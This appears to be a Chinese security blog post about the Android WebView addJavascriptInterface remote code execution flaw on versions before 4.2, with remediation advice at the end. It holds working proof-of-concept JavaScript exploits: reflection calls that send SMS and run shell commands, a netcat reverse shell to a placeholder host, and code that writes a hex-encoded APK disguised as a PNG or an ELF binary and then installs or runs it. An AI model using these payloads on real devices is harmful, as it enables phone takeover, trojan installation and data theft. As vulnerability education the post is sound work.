\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzUyMTA0MjQ4NA==&mid=2247494408&idx=4&sn=164730d27202b87ca6d5eb453efc7300&chksm=f9e38453ce940d452c2128b4076ce2b8eb1117f9db5c82ac184b9921d58aaf367ef5ffd1e040&xtrack=1&scene=90&subscene=93&sessionid=1602460613&clicktime=1602461038&enterid=1602461038&ascene=56&devicetype=android-29&version=2700133e&nettype=WIFI&abtest\_cookie=AAACAA%3D%3D&lang=zh\_CN&exportkey=AWYzc4aP69lznA3dHbIppA8%3D&pass\_ticket=pnZyakhq2QtF7v%2BQGAstZmv9NWQqvCbmLpFuJMx7SDuTICrEgZVu5Jm0CpXMMg4E&wx\_header=1)

推荐两本自己读过的书，学习的路上免不了啃书，

1\. WebView 远程代码执行漏洞描述
----------------------

      Android API level 16 以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用 WebView.addJavascriptInterface 方法，远程攻击者可通过使用 Java Reflection API 利用该漏洞执行任意 Java 对象的方法，简单的说就是通过 addJavascriptInterface 给 WebView 加入一个 JavaScript 桥接接口，JavaScript 通过调用这个接口可以直接操作本地的 JAVA 接口。

2\. WebView 远程代码执行影响范围
----------------------

      Android API level 小于 17 (即 Android 4.2 之前的系统版本)  

3.WebView 远程代码执行漏洞详情
--------------------

### 1) WebView 远程代码执行漏洞位置:

      WebView.addJavascriptInterface(Object obj, String interfaceName)   

### 2)WebView 远程代码执行漏洞触发前提条件：

      使用 addJavascriptInterface 方法注册可供 JavaScript 调用的 Java 对象；  
      使用 WebView 加载外部网页或者本地网页；  
      Android 系统版本低于 4.2；  

### 3) WebView 远程代码执行漏洞原理：

      Android 系统通过 WebView.addJavascriptInterface 方法注册可供 JavaScript 调用的 Java 对象，以用于增强 JavaScript 的功能。但是系统并没有对注册 Java 类的方法调用的限制。导致攻击者可以利用反射机制调用未注册的其它任何 Java 类，最终导致 JavaScript 能力的无限增强。攻击者利用该漏洞可以根据客户端能力为所欲为。  

4\. WebView 远程代码执行漏洞 POC
------------------------

      1) 利用 addJavascriptInterface 方法注册可供 JavaScript 调用的 java 对象 “injectedObj”，利用反射机制调用 Android API sendTextMessage 来发送短信。  
      java 代码：  

```
mWebView = new WebView(this);
mWebView.getSettings().setJavaScriptEnabled(true);
mWebView.addJavascriptInterface(this, "injectedObj");
mWebView.loadUrl("file:///android\_asset/www/index.html");
```

      EXP 的 JavaScript 代码：  

```
<html>
   <body>
      <script>
         var objSmsManager =     injectedObj.getClass().forName("android.telephony.SmsManager").getM ethod("getDefault",null).invoke(null,null);
          objSmsManager.sendTextMessage("10086",null,"this message is sent by JS when webview is loading",null,null);
       </script>
   </body>
</html>
```

      2) 利用 addJavascriptInterface 方法注册可供 JavaScript 调用的 java 对象 “injectedObj”，利用反射机制调用 Android API getRuntime 执行 shell 命令：  
      EXP 的 JavaScript 代码：  

```
<html>
   <body>
      <script>
         function execute(cmdArgs)
         {
             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
         }

         var res = execute(\["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"\]);
         document.write(getContents(res.getInputStream()));
       </script>
   </body>
</html>
```

      利用后的执行结果：   
![](https://mmbiz.qpic.cn/mmbiz_jpg/p5qELRDe5icnRBnle9hbcfwiaUrkxtHoQbDjZfVn0fCOXks02TnNNTXNKXo8niaY13VsuMhYypFLJ6m9CxviaABV1A/640?wx_fmt=jpeg)  
      3) 利用 addJavascriptInterface 方法注册可供 JavaScript 调用的 java 对象 “injectedObj”，利用反射机制调用 Android API getRuntime 执行 shell 命令，达到反弹一个手机端的 shell 到远程控制端的目的：  
      EXP 的 JavaScript 代码：  

```
<html>
   <body>
      <script>
         function execute(cmdArgs)
         {
             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
         }
         execute(\["/system/bin/sh","-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/system/bin/sh -i 2>&1|nc x.x.x.x 9099 >/tmp/f"\]);
       </script>
   </body>
</html>
```

      执行后的结果：  
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/p5qELRDe5icnRBnle9hbcfwiaUrkxtHoQbCwQFtrwUpmsibaFo9tPchibsUPGIlE7MUOHG3BClF78NuCFVcicvtia7xA/640?wx_fmt=jpeg)  
      4) 利用 addJavascriptInterface 方法注册可供 JavaScript 调用的 java 对象 “injectedObj”，利用反射机制调用 Android API getRuntime 执行 shell 命令进行挂马：a 安装木马应用 APK, b 安装执行 ELF 可执行程序；  
      简单的安装发送短信木马 APK，EXP 的 JavaScript 代码：  

```
<html>
   <body>
      <script>
         function execute(cmdArgs)
         {
             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
         }
         var apk = "\\\\x50\\\\x4B\\\\x03\\\\x04\\\\x14\\\\x00\\\\x08\\\\x00\\\\x08\\\\x00\\\\x62 \\\\xB9\\\\x15\\\\x30\\\\x3D\\\\x07\\\\x01\\\\x00\\\\x00\\\\x7C\\\\x01\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xD6\\\\x0D\\\\x00\\\\x00\\\\x4D\\\\x45\\\\x54\\\\x41\\\\x2D\\\\x49\\\\x4E\\\\x46\\\\x2F\\\\x43\\\\x45\\\\x52\\\\x54\\\\x2E\\\\x53------------------------------------------------------------ \\\\x4D\\\\x45\\\\x54\\\\x41\\\\x2D\\\\x49\\\\x4E\\\\x46\\\\x2F\\\\x43\\\\x45\\\\x52\\\\x54\\\\x2E\\\\x52\\\\x53\\\\x41\\\\x50\\\\x4B\\\\x05\\\\x06\\\\x00\\\\x00\\\\x00\\\\x00\\\\x07\\\\x00\\\\x07\\\\x00\\\\xBA\\\\x01\\\\x00\\\\x00\\\\xB6\\\\x11\\\\x00\\\\x00\\\\x00\\\\x00"
         execute(\["/system/bin/sh","-c","echo '"+apk+"' > /data/data/com.example.hellojs/fake.png"\]);
         execute(\["chmod","755","/data/data/com.example.hellojs/fake.png"\]);
         execute(\["su","-c","pm install -r /data/data/com.example.hellojs/fake.png"\]);
       </script>
   </body>
</html>
```

      由下图可得知我们已经拼接成了一个 APK 程序，并伪装成一张 png 图片：  
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/p5qELRDe5icnRBnle9hbcfwiaUrkxtHoQbHYfcViaEkMzWicEdzHAjjRCcyLuIqNlN77FYLtpjtalbv0a1BW8nJEhw/640?wx_fmt=jpeg)  
      由下图可知，我们已经成功安装 fake.png APK 程序：  
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/p5qELRDe5icnRBnle9hbcfwiaUrkxtHoQbCwj4qzZ5uERCzqSVt75Nv0YGrVtfXIm3gz5pGhr8Ut5Zzu5wtYHy4A/640?wx_fmt=jpeg)  
      例如网上流行的 Androrat 远程控制程序，攻击者利用上述漏洞即可简单的安装此远程控制木马应用 APK 即可达到远程控制用户手机的目的。     
      利用漏洞拼接可执行 ELF 程序，并执行该 ELF 程序达到为所欲为的目的，博文 Abusing WebView JavaScript Bridges【3】还实现了在非 root 情况下利用 ELF 可执行程序偷取 sdcard 的文件的 POC，由此可见，该漏洞的危害性极大：  
EXP 的 JavaScript 代码：  

```
<html>
   <body>
      <script>
         function execute(cmdArgs)
         {
             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
         }
            var bin = "\\\\x7F\\\\x45\\\\x4C\\\\x46\\\\x01\\\\x01\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x02\\\\x00\\\\x28\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\xE4\\\\x83\\\\x00\\\\x00\\\\x34\\\\x00\\\\x00\\\\x00\\\\x58\\\\x21\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x05\\\\x34\\\\x00\\\\x20\\\\x00\\\\x08\\\\x00\\\\x28\\\\x00\\\\x18\\\\x00\\\\x17\\\\x00\\\\x06\\\\x00\\\\x00\\\\x00\\\\x34\\\\x00\\\\x00\\\\x00\\\\x34\\\\x80\\\\x00\\\\x00\\\\x34\\\\x80\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x04\\\\x00\\\\x00\\\\x00\\\\x04\\\\x00\\\\x00\\\\x00\\\\x03\\\\x00\\\\x00\\\\x00\\\\x34\\\\x01\\\\x00\\\\x00\\\\x34\\\\x81\\\\x00\\\\x00\\\\x34\\\\x81\\\\x00\\\\x00\\\\x13--------------------------------------------------------------------------------------------------------------------------------\\\\x00\\\\x00\\\\x00\\\\x00\\\\xD4\\\\x00\\\\x00\\\\x00\\\\x03\\\\x00\\\\x00\\\\x70\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x44\\\\x20\\\\x00\\\\x00\\\\x2D\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x03\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x71\\\\x20\\\\x00\\\\x00\\\\xE4\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00";
            execute(\["/system/bin/sh","-c","echo '" + bin + "' > /data/data/com.example.hellojs/testBin"\]);
         execute(\["chmod","755","/data/data/com.example.hellojs/testBin"\]);
            var res = execute(\["/data/data/com.example.hellojs/testBin"\]);
           document.write(getContents(res.getInputStream()));
       </script>
   </body>
</html>
```

      “testBin” 文件已拼接生成，如下图所示：   
![](https://mmbiz.qpic.cn/mmbiz_jpg/p5qELRDe5icnRBnle9hbcfwiaUrkxtHoQbPz9Cm82Y670WnoLDvZ7bx587UTgI6c8TSvibWG573UL710d5tl8siaGA/640?wx_fmt=jpeg)  

      执行之后的结果如下：

 ![](https://mmbiz.qpic.cn/mmbiz_jpg/p5qELRDe5icnRBnle9hbcfwiaUrkxtHoQbULX3HXpLI8petia1EkZSqibPe3Rnuib68pLwlddajshLrjH3SXpmACFaA/640?wx_fmt=jpeg)

5\. WebView 远程代码执行漏洞修复建议
------------------------

### 1\. API Level 等于或低于 17 的 Android 系统【4】

      出于安全考虑，为了防止 Java 层的函数被随便调用，Google 在 4.2 版本之后，规定允许被调用的函数必须以 @JavascriptInterface 进行注解，所以如果某应用依赖的 API Level 为 17 或者以上，就不会受该问题的影响（注：Android 4.2 中 API Level 小于 17 的应用也会受影响）。

### 2\. API Level 等于或低于 17 的 Android 系统

      建议不要使用 addJavascriptInterface 接口，以免带来不必要的安全隐患。  
      如果一定要使用 addJavascriptInterface 接口:  
      1) 如果使用 HTTPS 协议加载 URL，应进行证书校验防止访问的页面被篡改挂马；  
      2) 如果使用 HTTP 协议加载 URL，应进行白名单过滤、完整性校验等防止访问的页面被篡改；  
      3) 如果加载本地 Html，应将 html 文件内置在 APK 中，以及进行对 html 页面完整性的校验；  

### 3\. 移除 Android 系统内部的默认内置接口

      同时，在 2014 年发现在 Android 系统中 webkit 中默认内置的一个 searchBoxJavaBridge\_ 接口同时存在远程代码执行漏洞，该漏洞公布于 CVE-2014-1939\[7\], 建议开发者通过以下方式移除该 Javascript 接口:    

```
removeJavascriptInterface("searchBoxJavaBridge\_")
```

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ffq88LJJ8oPhzuqa2g06cq4ibd8KROg1zLzfrh8U6DZtO1oWkTC1hOvSicE26GgK8WLTjgngE0ViaIFGXj2bE32NA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/x1FY7hp5L8Hr4hmCxbekk2xgNEJRr8vlbLKbZjjWdV4eMia5VpwsZHOfZmCGgia9oCO9zWYSzfTSIN95oRGMdgAw/640?wx_fmt=gif)

[app 安全之反编译（一）](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493235&idx=1&sn=39a28e6b6be63621faba9893bc3549a1&chksm=f9e38928ce94003e8a6fcb2253dfc26276075b3d047600e03ebbc6588d07c0535c23c31e9fda&scene=21#wechat_redirect)  

[Android 安全（二）—- 攻击框架 drozer 全功能介绍](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493235&idx=2&sn=38f3f7c95c235191589e4b2461ca5ca8&chksm=f9e38928ce94003ead029ad2b7add44117a0a06d4e1869438134305cd17abea9e2524767884b&scene=21#wechat_redirect)  

[Android 安全（三）—so 注入 (inject)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493298&idx=1&sn=1c64ebdfa70b81e80fa6773609e46b3e&chksm=f9e389e9ce9400ff35dc49cf7807b2e2d8e1b74a2ed489b7e95938f58f388703539210118f38&scene=21#wechat_redirect)  

[Android 安全（四）-- 数据库 之 SQLite 数据库](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493298&idx=2&sn=9a415b6e7dce40801e0d270af78fbdb5&chksm=f9e389e9ce9400ffca0b0be144db5c0556e2b1ab0b2d141fa66d56b58fa82c2b81f8163cc634&scene=21#wechat_redirect)  

[Android 安全（五）-- 查看 APK 的签名的方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493408&idx=1&sn=90fb5495e7bb8f0aa98519a3002b25d4&chksm=f9e3887bce94016de5f9f1cfec8197a54736b1a716cc2e0d608d6b2e3466989427c5da08e8d3&scene=21#wechat_redirect)  

[Android 安全（六）--apk 加固原理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493408&idx=2&sn=06905659024c6d2f385a8e594e030752&chksm=f9e3887bce94016d93247e3bac196cdb4e5383085e73bbd6159dd223e078369f142c3e118716&scene=21#wechat_redirect)

[Android 安全（七）--Keytool](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494122&idx=3&sn=a2b3b0e995f68fb2f678925c124c05fb&chksm=f9e386b1ce940fa7bc1a1c815a24fb6a2f49a6e9bd3c0dc613f2c9e5b146b6c68ba4eb4dcfd4&scene=21#wechat_redirect)  

[APK 签名校验绕过](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493664&idx=2&sn=cbca3b33aedc8468f60eda64fb25734b&chksm=f9e3877bce940e6da68def0070d283d1ce6c0d987c02f9f9bac23fbfb589c6ab065efaa1c9c5&scene=21#wechat_redirect)  

[ctf 系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493664&idx=1&sn=40df204276e9d77f5447a0e2502aebe3&chksm=f9e3877bce940e6d0e26688a59672706f324dedf0834fb43c76cffca063f5131f87716987260&scene=21#wechat_redirect)

[日志安全系列 - 安全日志](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494122&idx=1&sn=984043006a1f65484f274eed11d8968e&chksm=f9e386b1ce940fa79b578c32ebf02e69558bcb932d4dc39c81f4cf6399617a95fc1ccf52263c&scene=21#wechat_redirect)

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnAsbXzXAVx0TwTHEy4yhBTShsTzrKfPqByzM33IVib0gdPRn3rJw3oz2uXBa4h2msAcJV6mztxvjQ/640?wx_fmt=png)